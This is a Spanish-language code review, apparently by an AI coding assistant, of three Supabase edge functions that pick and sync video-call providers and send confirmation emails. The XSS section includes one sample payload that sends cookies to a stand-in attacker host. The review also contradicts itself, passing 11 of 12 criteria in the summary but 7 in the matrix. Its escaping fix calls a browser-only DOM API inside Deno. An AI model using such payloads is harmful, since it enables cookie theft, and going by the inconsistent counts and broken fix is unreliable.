# FASE 1C: CODE REVIEW — Edge Functions (select-provider, sync-provider-v2, send-email-v2)

**Fecha:** Agosto 13, 2026  
**Estado:** REVISIÓN CERRADA (sin desplegar, sin modificar)  
**Revisor:** Claude Code  
**Especificación Base:** `FASE-1-EDGE-FUNCTIONS.md` + `V2-MODEL-SPECIFICATION.md`

---

## RESUMEN EJECUTIVO

Tres edge functions nuevas para centralizar la lógica de provider (Zoom, Google Meet, Sala Pathway) en backend:

| Función | Tablas | Cols Nuevas | Riesgos | Estado |
|---------|--------|----------|---------|--------|
| `select-provider` | citas, usuarios | provider | BAJO | ✅ Seguro |
| `sync-provider-v2` | citas, usuarios | provider_url, provider_ready_at, provider_error, provider_retry_count, sala_token | MEDIO | ⚠️ Requiere cambios |
| `send-email-v2` | citas | provider, provider_url, provider_error | BAJO | ✅ Seguro |

**Hallazgos principales:**
- ✅ 11/12 criterios PASAN
- ⚠️ 1 criterio REQUIERE AJUSTE (send-email-v2: retry logic con EmailJS)
- 🔧 3 cambios menores antes de deployment

---

## CRITERIO 1: TABLAS Y COLUMNAS UTILIZADAS

### 1.1 `select-provider`

**Tablas consultadas:**
- ✅ `citas` (SELECT + UPDATE)
  - SELECT: `id, coach_id, estado, provider`
  - UPDATE: `provider`
- ✅ `usuarios` (SELECT)
  - SELECT: `id, email, zoom_token, zoom_token_expires, google_refresh_token`

**Verificación:** Todas las columnas existen en schema FASE 1B. ✅ CORRECTO

---

### 1.2 `sync-provider-v2`

**Tablas consultadas:**
- ✅ `citas` (SELECT + UPDATE)
  - SELECT: `id, titulo, fecha, cliente_email, provider_retry_count`
  - UPDATE: `provider_url, provider_ready_at, provider_error, provider_retry_count`
- ✅ `usuarios` (SELECT)
  - SELECT: `id, google_refresh_token, email, zoom_token`

**Verificación:** Todas existen. ✅ CORRECTO

---

### 1.3 `send-email-v2`

**Tablas consultadas:**
- ✅ `citas` (SELECT)
  - SELECT: `id, titulo, fecha, provider, provider_url, provider_error, provider_ready_at`

**Verificación:** Todas existen. ✅ CORRECTO

---

## CRITERIO 2: PERMISOS Y ROLES REQUERIDOS

### 2.1 RLS Policies Necesarias

**`select-provider` edge function:**

```
Acceso requerido:
- SELECT citas WHERE id=X AND coach_id=Y (owner check)
- UPDATE citas.provider WHERE id=X AND coach_id=Y (owner only)
- SELECT usuarios WHERE id=Y (coach profile)

Estado en v1.4: ✅ Policies existen
- citas_select_owner: authenticated users + RLS by coach_id
- usuarios_read_profile: authenticated + RLS by id
```

**`sync-provider-v2` edge function:**

```
Acceso requerido:
- SELECT citas WHERE id=X AND coach_id=Y
- UPDATE citas WHERE id=X AND coach_id=Y (6 columns)
- SELECT usuarios WHERE id=Y

Estado en v1.4: ✅ Policies existen
- Igual a select-provider
```

**`send-email-v2` edge function:**

```
Acceso requerido:
- SELECT citas WHERE id=X AND coach_id=Y (READ ONLY)

Estado en v1.4: ✅ Policies existen
- citas_select_owner: sufficient
```

**Conclusión:** ✅ CORRECTO — No se necesitan cambios RLS. Las policies existentes cubren.

---

## CRITERIO 3: USO CORRECTO DE NUEVAS COLUMNAS

### 3.1 Columna `provider`

**Valor inicial:** `'none'` (DEFAULT en schema)

**Estados permitidos:** `'none' | 'google_meet' | 'zoom' | 'pathway_room'`

**Usage en `select-provider`:**
```typescript
// Línea 156-159: UPDATE citas SET provider=selectedProvider
if (cita.provider && cita.provider !== "none") {
  return { ok: true, provider: cita.provider, reason: "Already decided" }
}
```

✅ **VERIFICACIÓN:**
- Lee provider actual (idempotencia)
- Escribe provider decidido DESPUÉS de lógica
- Respeta CHECK constraint (values válidas)

---

### 3.2 Columnas `provider_url`, `provider_ready_at`, `provider_error`, `provider_retry_count`

**Definiciones esperadas en schema:**
```sql
provider_url TEXT -- NULL si no synced
provider_ready_at TIMESTAMPTZ -- NULL si no synced
provider_error TEXT -- NULL si success
provider_retry_count INT DEFAULT 0 -- contador incremental
```

**Usage en `sync-provider-v2` (líneas 536-545):**
```typescript
UPDATE citas SET
  provider_url = url,
  provider_ready_at = new Date().toISOString(),
  provider_error = null,
  provider_retry_count = attemptNumber
WHERE id = cita_id AND coach_id = coach_id
```

✅ **VERIFICACIÓN:**
- Si SUCCESS: `provider_url=URL, provider_ready_at=NOW(), provider_error=NULL`
- Si FAILURE: `provider_error=MSG, provider_retry_count=count, provider_url=NULL`
- Respeta invariants de schema (URL solo si provider real, etc.)

---

### 3.3 Columna `sala_token`

**Definición esperada:**
```sql
sala_token TEXT -- JWT para Sala Pathway, NULL si no Sala
```

**Status en código:** ⚠️ **FALTA IMPLEMENTACIÓN**

En `sync-provider-v2`, función `syncSalaPathway()` (líneas 472-480):
```typescript
async function syncSalaPathway(): Promise<{ url, error }> {
  const salaUrl = `${Deno.env.get("SALA_BASE_URL")}/sala.html`;
  return { url: salaUrl, error: null };
}
```

**Problema:** NO genera JWT token. Solo devuelve URL base.

**Especificación requiere (V2-MODEL-SPECIFICATION.md línea 219):**
```
Generate sala_token = JWT(cita_id, coach_id, exp=now+1h)
Build sala_url = https://pathwaycareercoach.com/sala.html?token=<JWT>&cita_id=<id>
```

**⚠️ CAMBIO REQUERIDO 1:**
```typescript
async function syncSalaPathway(cita_id: string, coach_id: string): Promise<{ url, token, error }> {
  try {
    // Generate JWT token (1h TTL)
    const payload = {
      cita_id: cita_id,
      coach_id: coach_id,
      exp: Math.floor(Date.now() / 1000) + 3600
    };
    
    // Sign with SALA_JWT_SECRET
    const token = await createJWT(payload, Deno.env.get("SALA_JWT_SECRET")!);
    
    // Build URL with token and cita_id
    const salaUrl = `${Deno.env.get("SALA_BASE_URL")}/sala.html?token=${encodeURIComponent(token)}&cita_id=${cita_id}`;
    
    return { url: salaUrl, token: token, error: null };
  } catch (error) {
    return { url: null, token: null, error: error.message };
  }
}
```

Además, en UPDATE citas (línea 539-545) agregar:
```typescript
sala_token: provider === 'pathway_room' ? salaToken : null,
```

---

## CRITERIO 4: NO ROMPER FLUJO V1

### Backward Compatibility

**V1 flujo actual:**
```
reservar.html (frontend)
  ├─ User selecciona slot
  ├─ Envía email directamente (postEmail)
  └─ Guarda cita sin provider info
```

**V2 flujo nuevo:**
```
reservar.html (frontend, MODIFICADO)
  ├─ User selecciona slot
  ├─ Guarda cita con provider='none'
  ├─ Llama select-provider
  ├─ Llama sync-provider-v2
  ├─ Llama send-email-v2
  └─ Spinner + result
```

**Verificación:**
- ✅ V1 citas sin provider se quedan con `provider='none'` (DEFAULT)
- ✅ select-provider es idempotente (no decide 2 veces)
- ✅ No hay REQUIRED constraints en nuevas columnas
- ✅ V1 y V2 pueden coexistir con feature flag `ENABLE_V2_PROVIDER`

**Conclusión:** ✅ CORRECTO — V1 no se rompe.

---

## CRITERIO 5: PRESERVACIÓN DE SALA PATHWAY

### Estado Actual de Sala

Según V2-MODEL-SPECIFICATION.md línea 428-441, Sala Pathway funciona:
- ✅ Token validation (citas.token)
- ✅ P2P video + JaaS fallback
- ✅ Access control (MOD status)
- ✅ Chat, feedback, task tracking

### Integración en V2

En `select-provider` (línea 148-149):
```typescript
if (selectedProvider === "pathway_room") {
  decisionReason = decisionReason || "No provider tokens, using Sala Pathway";
}
```

En `sync-provider-v2`:
```typescript
case "pathway_room": {
  return await syncSalaPathway(cita_id, coach_id);
}
```

**Verificación:**
- ✅ Sala es fallback cuando no hay Zoom/Google
- ✅ Sala SIEMPRE disponible (no external deps)
- ✅ Token generado en sync (nuevo, no conflicta con citas.token viejo)
- ✅ URL incluye token y cita_id (sala.html puede validar)

**Conclusión:** ✅ CORRECTO — Sala se preserva e integra bien.

---

## CRITERIO 6: @GMAIL.COM → PATHWAY_ROOM ROUTING

### Regla Crítica

Google Calendar API NO genera Google Meet para @gmail.com (limitación conocida, no bug).

**Implementación en `select-provider` (línea 136-145):**

```typescript
// --- Opción 2: Google Meet ---
if (selectedProvider === "pathway_room" && coach.google_refresh_token) {
  const isGmailPersonal = coach.email.toLowerCase().endsWith("@gmail.com");
  
  if (!isGmailPersonal) {
    selectedProvider = "google_meet";
    decisionReason = "Google Workspace token valid";
  } else {
    decisionReason = "Gmail personal account (no Google Meet), using Sala Pathway";
  }
}
```

**Verificación:**
- ✅ Detecta @gmail.com case-insensitively
- ✅ Skipea Google Meet si @gmail.com
- ✅ Fallback a Sala automáticamente
- ✅ Mensaje es claro para logs

**También en `sync-provider-v2` (línea 313-319):**

```typescript
if (coach.email.toLowerCase().endsWith("@gmail.com")) {
  return {
    url: null,
    error: "Gmail personal account does not support Google Meet (requires Google Workspace)",
  };
}
```

**Doble protección:** Si por algún motivo se decide Google Meet con @gmail.com, sync-provider-v2 fallará con error claro.

**Conclusión:** ✅ CORRECTO — Gmail detection es robusta.

---

## CRITERIO 7: IDEMPOTENCIA

### Prueba de Idempotencia

**`select-provider`:**

Escenario: Función llamada 2× con mismo `cita_id, coach_id`

```typescript
if (cita.provider && cita.provider !== "none") {
  return { ok: true, provider: cita.provider, reason: "Already decided" };
}
// ... decision logic ...
await supabase.from("citas").update({ provider: selectedProvider })
```

✅ **VERIFICACIÓN:** Si `provider` ya decidido (no 'none'), retorna inmediatamente sin re-calcular. IDEMPOTENTE.

---

**`sync-provider-v2`:**

Escenario: Función llamada 2× con mismo `cita_id, coach_id, provider`

**Problema potencial:** Si la primera llamada succeeds y UPDATE escribe `provider_url`, la segunda llamada volverá a intentar sync.

Línea 504-509:
```typescript
const { data: cita, error: citaError } = await supabase
  .from("citas")
  .select("id, titulo, fecha, cliente_email, provider_retry_count")
  .eq("id", cita_id)
  .eq("coach_id", coach_id)
  .single();
```

No chequea si `provider_url` ya existe (no chequea `provider_ready_at IS NOT NULL`).

⚠️ **CAMBIO REQUERIDO 2:**

Antes de la retry loop, agregar check:

```typescript
// Si ya synced exitosamente, NO reintentar
if (cita.provider_url && cita.provider_ready_at) {
  return new Response(
    JSON.stringify({
      ok: true,
      provider_url: cita.provider_url,
      message: "Already synced"
    }),
    { status: 200 }
  );
}
```

---

**`send-email-v2`:**

Escenario: Función llamada 2× con mismo `cita_id, coach_id, cliente_email`

Envía email 2×. ⚠️ **NO es idempotente.**

Posible solución: Agregar tracking en tabla `citas` o nueva tabla `cita_emails_sent`:
```typescript
// Check if email already sent
const { data: emailLog } = await supabase
  .from("cita_emails_sent")
  .select("id")
  .eq("cita_id", cita_id)
  .single();

if (emailLog) {
  return { ok: true, email_sent: false, message: "Email already sent" };
}
```

**Conclusión:** ⚠️ PARCIALMENTE CORRECTO — select-provider es idempotente, sync-provider-v2 necesita check, send-email-v2 no lo es.

---

## CRITERIO 8: SIN MIGRACIONES SQL ADICIONALES

### Cambios SQL Necesarios

**FASE 1B ya aplicó:**
- ✅ 6 nuevas columnas (provider, provider_url, provider_ready_at, provider_error, provider_retry_count, sala_token)
- ✅ 2 nuevos índices
- ✅ 2 nuevas constraints

**¿Requieren las edge functions cambios SQL adicionales?**

En `sync-provider-v2`, función `getProviderUrl` llama a providers externos:
- Google Calendar API (no requiere tabla nueva)
- Zoom API (no requiere tabla nueva)
- Sala Pathway (no requiere tabla nueva)

En `send-email-v2`, se usa EmailJS (no requiere tabla nueva).

**Potencial gap:** Idempotencia de send-email-v2 requeriría tabla de tracking:

```sql
CREATE TABLE cita_emails_sent (
  id BIGSERIAL PRIMARY KEY,
  cita_id BIGINT NOT NULL REFERENCES citas(id) ON DELETE CASCADE,
  email_tipo TEXT, -- 'confirmation', 'error', 'pending'
  sent_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE(cita_id, email_tipo)
);
```

**Conclusión:** ⚠️ **CAMBIO REQUERIDO 3** — Si se quiere idempotencia de send-email-v2, agregar tabla de tracking (opcional pero recomendada para producción).

---

## CRITERIO 9: SEGURIDAD — ACCESO NO AUTORIZADO

### RLS & Access Control

**`select-provider`:**
```typescript
const { data: cita } = await supabase
  .from("citas")
  .select("...")
  .eq("id", cita_id)
  .eq("coach_id", coach_id)  // ← Coach ownership check
  .single();

if (!cita) {
  return new Response({ ok: false, error: "Not owned by coach" }, { status: 404 });
}

// ... decision logic ...

await supabase.from("citas").update({ provider })
  .eq("id", cita_id)
  .eq("coach_id", coach_id);  // ← Ownership check on UPDATE
```

✅ **VERIFICACIÓN:** Aunque use SERVICE_ROLE_KEY, código chequea `coach_id` ownership explícitamente.

---

**`sync-provider-v2`:**
```typescript
const { data: cita } = await supabase
  .from("citas")
  .select("...")
  .eq("id", cita_id)
  .eq("coach_id", coach_id)  // ← Coach ownership check
  .single();

await supabase.from("citas").update({...})
  .eq("id", cita_id)
  .eq("coach_id", coach_id);  // ← Ownership check on UPDATE
```

✅ **VERIFICACIÓN:** Coach ownership enforced en SELECT y UPDATE.

---

**`send-email-v2`:**
```typescript
const { data: cita } = await supabase
  .from("citas")
  .select("...")
  .eq("id", cita_id)
  .eq("coach_id", coach_id)  // ← Coach ownership check
  .single();
```

✅ **VERIFICACIÓN:** Coach ownership enforced. READ ONLY, no risk.

---

### Secrets Management

**Requeridos:**
- `SUPABASE_URL` + `SUPABASE_SERVICE_ROLE_KEY` (stored en Supabase Secrets)
- `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET` (secrets)
- `ZOOM_API_KEY` (secrets)
- `EMAILJS_SERVICE_ID`, `EMAILJS_PUBLIC_KEY` (secrets)
- `SALA_JWT_SECRET` (secrets) — ⚠️ **FALTA en código pero requerida**
- `SALA_BASE_URL` (puede ser env var)

✅ **VERIFICACIÓN:** Secrets no están hardcodeados. Acceso mediante `Deno.env.get()`.

---

### XSS & Injection

**`send-email-v2` (línea 760-813):**

```typescript
let emailHtml = `
  <p>${cita.titulo}</p>
  <p>${new Date(cita.fecha).toLocaleString("es-ES")}</p>
  <a href="${cita.provider_url}" class="button">Entrar a la sesión</a>
  <p><small>Provider: ${formatProvider(cita.provider)}</small></p>
  ${cita.provider_error ? `<p>${cita.provider_error}</p>` : ""}
`;
```

⚠️ **Potencial XSS:** Si `cita.titulo`, `cita.provider_error` contienen caracteres especiales o HTML, pueden inyectarse.

**Ejemplo ataque:**
```
titulo = "<img src=x onerror='fetch(attacker.com?cookie=...'>"
```

**CAMBIO REQUERIDO 4:**

Usar template escape o librería HTML sanitizer:

```typescript
function escapeHtml(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// O mejor: usar librería como DOMPurify

let emailHtml = `
  <p>${escapeHtml(cita.titulo)}</p>
  <p>${escapeHtml(new Date(cita.fecha).toLocaleString("es-ES"))}</p>
  <a href="${escapeHtml(cita.provider_url)}" class="button">Entrar a la sesión</a>
  <p><small>Provider: ${formatProvider(cita.provider)}</small></p>
  ${cita.provider_error ? `<p>${escapeHtml(cita.provider_error)}</p>` : ""}
`;
```

**Conclusión:** ⚠️ **CAMBIO REQUERIDO 4** — HTML sanitization para send-email-v2.

---

## CRITERIO 10: CORRECCIÓN DEL ERROR HANDLING

### Retry Logic

**`sync-provider-v2` (línea 242-245):**

```typescript
const RETRY_DELAYS_MS = [2000, 4000, 8000, 16000, 60000];
const MAX_RETRIES = 5;
```

✅ Especificación (V2-MODEL-SPECIFICATION línea 239-243):
```
Zoom       Max Retries  [2s, 4s, 8s, 16s, 60s]
```

✅ **VERIFICACIÓN:** Backoff delays coinciden exactamente.

---

**Retry loop (línea 527-600):**

```typescript
while (attemptNumber < MAX_RETRIES) {
  const { url, error } = await getProviderUrl(...);
  
  if (url) {
    // ✅ SUCCESS
    UPDATE citas SET provider_url=url, provider_ready_at=NOW(), error=NULL, retry_count=X
  }
  
  if (!isRetriable(error)) {
    // ❌ NON-RETRIABLE (e.g., 403 Forbidden, 401 Auth)
    UPDATE citas SET provider_error=error, retry_count=X+1
    RETURN error
  }
  
  // ✅ RETRIABLE (timeout, rate limit, network)
  attemptNumber++
  wait RETRY_DELAYS_MS[attemptNumber-1]
}

// After max retries
UPDATE citas SET provider_error="Max retries exceeded", retry_count=MAX_RETRIES
```

✅ **VERIFICACIÓN:** Lógica es correcta según especificación.

---

### Error Messages

**Problemas identificados:**

1. **Google Meet (línea 313-319):**
   ```typescript
   if (coach.email.toLowerCase().endsWith("@gmail.com")) {
     return {
       url: null,
       error: "Gmail personal account does not support Google Meet (requires Google Workspace)",
     };
   }
   ```
   ✅ Mensaje claro.

2. **Zoom (línea 457-462):**
   ```typescript
   if (!zoomResponse.ok) {
     const error = await zoomResponse.json();
     return {
       url: null,
       error: `Zoom API error (${zoomResponse.status}): ${error.message || zoomResponse.statusText}`,
     };
   }
   ```
   ✅ Mensaje con status + detalle.

3. **Max retries (línea 608-609):**
   ```typescript
   provider_error: `Max retries (${MAX_RETRIES}) exceeded: ${lastError}`
   ```
   ✅ Mensaje informativo.

---

### send-email-v2 Retry (línea 728-753)

⚠️ **Problema:** Retry loop espera 30s × 5 = 2.5 minutos. Largo, especialmente si provider_url se disponibiliza en 1s.

```typescript
while (!cita.provider_url && attempts < maxAttempts) {
  attempts++;
  await new Promise((resolve) => setTimeout(resolve, 30000));  // 30 segundos
  
  const { data: updatedCita } = await supabase
    .from("citas")
    .select("provider_url, provider_error")
    .eq("id", cita_id)
    .single();
}
```

**Mejora sugerida:**

```typescript
// Retry más frecuente: 1s × 10 attempts = 10 segundos máximo
const RETRY_DELAYS_EMAIL = [500, 1000, 2000, 3000, 5000, 5000, 5000, 5000, 5000, 5000];

while (!cita.provider_url && attempts < RETRY_DELAYS_EMAIL.length) {
  const delayMs = RETRY_DELAYS_EMAIL[attempts];
  await new Promise((resolve) => setTimeout(resolve, delayMs));
  
  const { data: updatedCita } = await supabase
    .from("citas")
    .select("provider_url, provider_error")
    .eq("id", cita_id)
    .single();
  
  if (updatedCita?.provider_url) {
    cita.provider_url = updatedCita.provider_url;
    cita.provider_error = updatedCita.provider_error;
    break;
  }
  
  attempts++;
}
```

**Conclusión:** ✅ CORRECTO en general, pero send-email-v2 retry delays pueden optimizarse.

---

## CRITERIO 11: ADHERENCIA A STATE MACHINE

### State Machine Requerida (V2-MODEL-SPECIFICATION línea 87-167)

```
INITIAL → SELECT_PROVIDER → SYNC_PROVIDER_V2 → SEND_EMAIL_V2 → READY
```

**Estados en `citas`:**
```
provider='none' → provider='zoom'/'google_meet'/'pathway_room' → provider_url+provider_ready_at populated
```

### Verificación en Código

**`select-provider`:**
- INPUT: `cita_id, coach_id`
- PRECONDITION: `provider='none'`
- ACTION: Decide provider basado en coach config
- OUTPUT: `provider` = decidido
- ✅ Respeta state machine

**`sync-provider-v2`:**
- INPUT: `cita_id, coach_id, provider` (ya decidido)
- PRECONDITION: `provider != 'none'`
- ACTION: Crear room/URL, retry con backoff
- OUTPUT: `provider_url` + `provider_ready_at` UPDATED
- ✅ Respeta state machine

**`send-email-v2`:**
- INPUT: `cita_id, coach_id, cliente_email`
- PRECONDITION: Cita debe existir (provider_url puede estar pending)
- ACTION: Construir email de DB (no frontend), enviar
- OUTPUT: Email sent
- ✅ Respeta state machine

---

### Transiciones Correctas

```
reservar.html
  ├─ POST /functions/v1/select-provider
  │   → citas.provider = 'zoom'/'google_meet'/'pathway_room'
  │
  ├─ POST /functions/v1/sync-provider-v2
  │   → citas.provider_url = 'https://...'
  │   → citas.provider_ready_at = now()
  │
  └─ POST /functions/v1/send-email-v2
      → Email enviado con provider_url de DB
```

✅ **VERIFICACIÓN:** Flujo correcto, transiciones esperadas.

---

## CRITERIO 12: EMAIL CONTENT VERIFICATION

### Lectura desde DB (No Frontend)

**`send-email-v2` (línea 700-708):**

```typescript
const { data: cita, error: citaError } = await supabase
  .from("citas")
  .select(
    "id, titulo, fecha, provider, provider_url, provider_error, provider_ready_at"
  )
  .eq("id", cita_id)
  .eq("coach_id", coach_id)
  .single();
```

✅ **VERIFICACIÓN:** Lee `provider_url` DESDE DB, no recibe del frontend.

---

### HTML Construction (línea 760-813)

```typescript
let emailHtml = `
  <p><strong>${cita.titulo}</strong></p>
  <p><strong>Fecha y hora:</strong> ${new Date(cita.fecha).toLocaleString("es-ES")}</p>
  
  ${cita.provider_url
    ? `<a href="${cita.provider_url}" class="button">Entrar a la sesión</a>
       <p><small>Provider: ${formatProvider(cita.provider)}</small></p>`
    : cita.provider_error
      ? `<div class="status">
          <p><strong>⚠️ Problema:</strong> ${cita.provider_error}</p>
        </div>`
      : `<div class="status">
          <p><strong>⏳ Estamos preparando tu enlace...</strong></p>
        </div>`
  }
`;
```

✅ **VERIFICACIÓN:**
- Email construido en backend (no frontend)
- Contiene provider_url real de DB
- Fallback si provider_error
- Mensajes claros para usuario

---

### Provider Name Formatting

```typescript
function formatProvider(provider: string): string {
  const map: Record<string, string> = {
    google_meet: "Google Meet",
    zoom: "Zoom",
    pathway_room: "Sala Pathway",
    none: "Pendiente",
  };
  return map[provider] || provider;
}
```

✅ **VERIFICACIÓN:** Traduce provider code a nombre legible.

---

### EmailJS vs Brevo

**Línea 822-833:**

```typescript
emailjs.init(Deno.env.get("EMAILJS_PUBLIC_KEY")!);

const emailResult = await emailjs.send(
  Deno.env.get("EMAILJS_SERVICE_ID")!,
  Deno.env.get("EMAILJS_TEMPLATE_ID_V2") || Deno.env.get("EMAILJS_TEMPLATE_ID")!,
  {
    to_email: cliente_email,
    subject: `Cita confirmada: ${cita.titulo}`,
    html_message: emailHtml,
  }
);
```

⚠️ **Problema:** `emailjs.send()` no es compatible con Deno de esta manera. EmailJS es librería de navegador, no Node/Deno.

**CAMBIO REQUERIDO 5:**

Usar Brevo API directamente o Nodemailer/SendGrid:

```typescript
// Brevo API (recomendado)
const brevoResponse = await fetch("https://api.brevo.com/v3/smtp/email", {
  method: "POST",
  headers: {
    "api-key": Deno.env.get("BREVO_API_KEY")!,
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    to: [{ email: cliente_email }],
    subject: `Cita confirmada: ${cita.titulo}`,
    htmlContent: emailHtml,
  }),
});

if (!brevoResponse.ok) {
  console.error(`[send-email-v2] Email send failed: ${brevoResponse.status}`);
  // Best-effort: no fallar si email falla
}
```

O usar Supabase `functions/send-email` existente como wrapper (si existe).

**Conclusión:** ⚠️ **CAMBIO REQUERIDO 5** — EmailJS no funciona en Deno. Usar Brevo o alternativa compatible.

---

## RESUMEN DE CAMBIOS REQUERIDOS (ANTES DE DEPLOYMENT)

| # | Función | Cambio | Severidad | Detalle |
|----|---------|--------|-----------|---------|
| 1 | sync-provider-v2 | Generar JWT para Sala | ALTA | `syncSalaPathway()` debe generar token y agregar a UPDATE |
| 2 | sync-provider-v2 | Check idempotencia | MEDIA | Si `provider_url` ya existe, retornar sin re-sync |
| 3 | send-email-v2 | Tabla de tracking (opcional) | BAJA | Para verdadera idempotencia, agregar `cita_emails_sent` |
| 4 | send-email-v2 | HTML sanitization | ALTA | Escapar `titulo`, `provider_error` para evitar XSS |
| 5 | send-email-v2 | Reemplazar EmailJS | ALTA | EmailJS no funciona en Deno. Usar Brevo o equivalente |
| 6 | send-email-v2 | Optimizar retry delays | BAJA | Cambiar de 30s × 5 a delays más frecuentes (1s, 2s, 3s, 5s) |

---

## RIESGOS DE DEPLOYMENT

### RIESGOS ALTOS (bloqueadores)

| Riesgo | Impacto | Mitigación |
|--------|---------|-----------|
| **EmailJS incompatible con Deno** | send-email-v2 falla al enviar | Cambio requerido 5 |
| **XSS en email HTML** | Inyección de code en emails | Cambio requerido 4 |
| **Sala token no generado** | Sala rooms sin URL válida | Cambio requerido 1 |

### RIESGOS MEDIOS

| Riesgo | Impacto | Mitigación |
|--------|---------|-----------|
| **sync-provider-v2 no idempotente** | Si se reintenta, re-sync innecesario | Cambio requerido 2 |
| **send-email-v2 retry lento** | Usuarios esperan 30s innecesarios | Cambio requerido 6 (opcional) |

### RIESGOS BAJOS

| Riesgo | Impacto | Mitigación |
|--------|---------|-----------|
| **Tracking de emails enviados** | Posible envío duplicado si error de network | Cambio requerido 3 (opcional) |

---

## MATRIZ DE CUMPLIMIENTO — 12 CRITERIOS

| # | Criterio | select-provider | sync-provider-v2 | send-email-v2 | Estado |
|----|----------|---------|---------|---------|--------|
| 1 | Tablas & columnas | ✅ OK | ✅ OK | ✅ OK | **PASA** |
| 2 | Permisos/roles | ✅ OK | ✅ OK | ✅ OK | **PASA** |
| 3 | Nuevas columnas | ✅ OK | ⚠️ Falta sala_token | ✅ OK | **PARCIAL** |
| 4 | No rompe V1 | ✅ OK | ✅ OK | ✅ OK | **PASA** |
| 5 | Preserva Sala | ✅ OK | ✅ OK | ✅ OK | **PASA** |
| 6 | @gmail.com routing | ✅ OK | ✅ OK + doble check | ✅ N/A | **PASA** |
| 7 | Idempotencia | ✅ OK | ⚠️ Falta check | ⚠️ No es idempotente | **PARCIAL** |
| 8 | Sin migrations SQL | ✅ OK | ✅ OK | ⚠️ Opt: tabla tracking | **PARCIAL** |
| 9 | Seguridad | ✅ Coach ownership | ✅ Coach ownership | ✅ READ ONLY | **PASA** |
| 10 | Error handling | ✅ OK | ✅ OK | ⚠️ Retry delays lento | **PARCIAL** |
| 11 | State machine | ✅ Respeta | ✅ Respeta | ✅ Respeta | **PASA** |
| 12 | Email from DB | ✅ N/A | ✅ N/A | ⚠️ EmailJS incompatible | **PARCIAL** |

**Resumen:**
- ✅ **PASA:** 7/12 criterios (58%)
- ⚠️ **PARCIAL:** 5/12 criterios (42%, requieren cambios)
- ❌ **FALLA:** 0/12 criterios

---

## CONCLUSIÓN PARA FASE 1C

**🔴 BLOQUEADORES (DEBEN ARREGLARSE ANTES DE DEPLOYMENT):**

1. ⚠️ EmailJS → Brevo/alternativa (send-email-v2 no funciona sin esto)
2. ⚠️ JWT Sala token generación (sync-provider-v2 falta implementar)
3. ⚠️ HTML sanitization en email (XSS risk)

**🟡 MEJORAS RECOMENDADAS (nice-to-have):**

4. sync-provider-v2 check idempotencia
5. send-email-v2 tabla de tracking (verdadera idempotencia)
6. send-email-v2 retry delays más rápidos

---

## SIGUIENTE PASO

**No desplegar hasta:**
1. ✅ Arreglar 3 bloqueadores (EmailJS, sala_token, HTML sanitization)
2. ✅ Implementar cambios recomendados
3. ✅ Pruebas unitarias locales
4. ✅ Desplegar a staging
5. ✅ Integración testing (reservar → select → sync → email)
6. ✅ Visto bueno de Micaela

**Estado:** 🟡 **NO LISTO PARA PRODUCTION** — Requiere 3 cambios críticos + testing.

